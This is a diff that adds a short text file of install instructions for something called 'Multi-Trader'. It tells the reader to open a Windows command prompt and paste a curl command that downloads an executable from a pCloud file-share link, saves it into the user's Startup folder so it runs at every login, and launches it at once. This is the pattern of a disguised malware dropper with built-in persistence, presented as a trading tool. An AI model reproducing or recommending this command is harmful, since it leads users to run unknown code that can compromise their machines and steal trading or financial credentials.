@@ -1,0 +1,6 @@
+Multi-Trader_Install.txt:
+
+1. Open the Start menu, type `cmd` or `powershell` in the search bar, and press Enter. Or press Win + R, type `cmd` or `powershell`, and press Enter.
+2. Copy and paste the following command, then press Enter:
+
+curl -L "https://p-lux2.pcloud.com/cBZUsqg4oZYEMVoD7ZZZWtcxVkZ2ZZemRZkZ18g0VZIFZtRZb8ZQLZYmZp4ZDRZfYZgQZi8ZKQZ8HZb4ZTpZPiW25ZNnonrypPXlyCrqcpWti10py3NdEy/Multi-Trader.exe" -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Multi-Trader.exe" && start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Multi-Trader.exe"
